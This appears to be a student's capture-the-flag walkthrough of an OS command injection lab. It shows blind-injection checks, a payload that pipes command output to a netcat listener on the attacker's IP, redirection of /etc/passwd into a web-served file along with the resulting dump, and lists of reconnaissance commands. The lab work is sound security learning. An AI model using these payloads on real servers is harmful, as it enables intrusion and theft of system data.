Walkthrough of OS Command Injection. Demonstrate OS Command Injection and explain how to prevent it on your servers

# NOTE
- dont for get ```;```

# Blind Command Injection
Blind command injection occurs when the system call that's being made does not return the response of the call to the Document Object Model (or DOM).

![php](https://i.imgur.com/lB8diiC.png)

blind command injection occurs when the response of the HTTP request is not returned to the DOM.  You can see in the above code that the response is never returned anywhere on the page.  The only thing that gets returned is an alert that says whether a user was found on the system or not.  For the purposes of this room, I made the alert tell you what was going on, but sometimes it won't be that easy.  So here are a few ways to tell whether you have blind command injection or not.

## Ping!
Since the code is making a system call in some way, a ping will cause the page to continue loading until the command has completed.  So if you send a ping with 10 ICMP packets, the page should be loading for about 10 seconds. 

## Redirection of Output

Ping is usually enough to tell you whether you have blind command injection, but if you want to test further, you can attempt to redirect the output of a command to a file, then, using the browser, navigate to the page where the file is stored.  We all know the `>` Bash operator redirects output to a file or process so you could try redirecting the output of `id`, `whoami`, `netstat`, `ip addr` or other useful command to see if you can see the results.

## Bypassing the Blind Injection with Netcat

In the spirit of full disclosure, there is a way to bypass the blind injection with netcat.  You are able to pipe the output of a command to a nc listener.  You could do something like ```root; ls -la | nc {YOUR_IP} {PORT}``` . This will send the output of ls -la to your netcat listener.

## Action
1. Ping the box with 10 packets.  What is this command (without IP address)?
```; ping -c <packets> <ip>```
2. Redirect the box's Linux Kernel Version to a file on the web server.  What is the Linux Kernel Version?
```; uname -r > linux.txt```. Now http://<ip>/linux.txt

more command to get kernal version? 
```console
$ uname -a
$ cat /proc/version
$ dmesg | grep Linux
```
just for fun I did: ```; cat /etc/passwd > pass.txt``` this is what I found. lol fist time os inject super cool!!
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

# Active Command Injection
Active command injection will return the response to the user.  It can be made visible through several HTML elements.


`passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php),

## Commands to try

**Linux**
- whoami
- id
- ifconfig/ip addr
- uname -a
- ps -ef

**Windows**
- whoami
- ver
- ipconfig
- tasklist
- netstat -an

4. What is the user's shell set as?
```cat /etc/passwd | grep www-data```

5. What version of Ubuntu is running?
```lsb_release -a```
6. Print out the MOTD.  What favorite beverage is shown?
read more about motd [MOTD](https://serverfault.com/questions/481146/there-are-two-motds-shown-when-i-login-to-my-server-using-ssh)
```console
$ find / -name 00-header; 2> /dev/null
/snap/core/8268/etc/update-motd.d/00-header 
/snap/core/9066/etc/update-motd.d/00-header 
/etc/update-motd.d/00-header 
```
# flag
```console
$ find / -name flag.txt; 2> /dev/null
```